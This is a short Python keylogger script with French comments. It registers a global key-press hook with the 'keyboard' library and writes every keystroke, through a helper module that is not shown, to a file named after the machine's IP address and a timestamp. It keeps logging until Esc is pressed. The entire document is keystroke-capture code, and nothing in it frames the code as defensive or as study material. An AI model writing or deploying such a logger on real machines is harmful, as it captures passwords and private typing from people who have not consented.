import keyboard, socket
import functions
from time import strftime

ip_host = socket.gethostbyname(socket.gethostname())
time = strftime("%Y-%m-%d_%H-%M-%S")
file_name = ip_host + "_" + time + ".txt"

sys = functions.detect_os()

file_path = functions.creation_fichier(file_name, sys)

# Active le mode d'enregistrement des touches
keyboard.on_press(lambda event: functions.touche_fichier(file_path, event))

try:
    # Maintient le programme en cours d'exécution
    keyboard.wait("esc")
except KeyboardInterrupt:
    pass

# Désactive le mode d'enregistrement global des touches
keyboard.unhook_all()